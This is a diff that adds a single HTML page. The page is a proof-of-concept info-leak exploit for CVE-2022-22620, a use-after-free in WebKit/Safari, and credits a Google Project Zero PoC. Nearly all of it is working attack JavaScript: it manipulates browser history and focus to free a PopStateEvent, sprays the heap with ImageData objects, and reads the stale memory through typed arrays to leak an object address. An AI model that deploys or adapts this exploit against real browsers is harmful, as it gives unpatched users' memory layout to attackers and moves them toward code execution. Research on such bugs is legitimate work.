@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+ 
+<script>
+x = [1.1];
+
+			
+var buffer      = new ArrayBuffer(8);
+var byteView    = new Uint8Array(buffer);
+var uint32View  = new Uint32Array(buffer);
+var float64View = new Float64Array(buffer);
+
+
+function myfunc3(leaked,b,c,d,e,f,g,h,i,j,k,l)
+{
+if( leaked!=x) {
+
+float64View[0] = leaked;
+
+alert("Leaked object: 0x"+ (uint32View[1]|0x20000).toString(16)  + (uint32View[0]>>8).toString(16) );
+
+}
+//console.log(arguments);
+}                
+        
+function myfunc(a,b,c,d,e,f,g,h,i,j,k,l)
+{
+}        
+        
+
+
+function test_poc_safari()
+    {
+
+	window.addEventListener('popstate', (event) => { 
+						
+	event = null;
+	for(i=0; i<15750; i++) setTimeout(myfunc3,15000,x,0x61,2,3,4,5,6,7,8,9,10,11);
+	setInterval( ()=> { 	for(i=0; i<200750; i++) new ImageData(1,96/4); 	} , 1500);				// trigger PopStateEvent::~PopStateEvent and dec the refcount 	
+	});
+            
+            
+                input = document.body.appendChild(document.createElement("input"));
+
+				foo = document.body.appendChild(document.createElement("a"));
+				foo.id = "foo";
+
+				for(i=0; i<1000; i++)	setTimeout(myfunc,0,0x61,0x61,0,4,5,6,7,8,9,10,11,12);
+
+				history.pushState("", "", location + "#foo");
+				for(i=0; i<1000; i++)	setTimeout(myfunc,0,0x61,0x61,0,4,5,6,7,8,9,10,11,12);
+				//Current state = state2
+
+				history.pushState("", "");
+				
+				setTimeout(() => {
+						
+						// Set the focus on the input element.
+						// During the call to back() the focus will change to the foo element 
+						// and therefore triggering the blur event on the input element
+						input.focus(); 
+						
+						input.onblur = () => {history.replaceState("", "");  
+						
+						 }
+						setTimeout(() => { history.back();   }, 500);		}, 500);
+
+
+        }
+     </script>
+    <head>
+     </head>
+     <body>
+        <h1>CVE-2022-22620: Use-after-free in Safari</h1>
+        <h1>info leak exploit: Tested on webkitgtk-2.34.3 (UBUNTU64) </h1>
+        
+        <h1>Based on Google Project Zero <a href=https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html> POC</a></h1>
+        <center><button onclick="test_poc_safari();"> Test CVE-2022-22620 </button></center>
+     </body>
+
+    
+   </html>
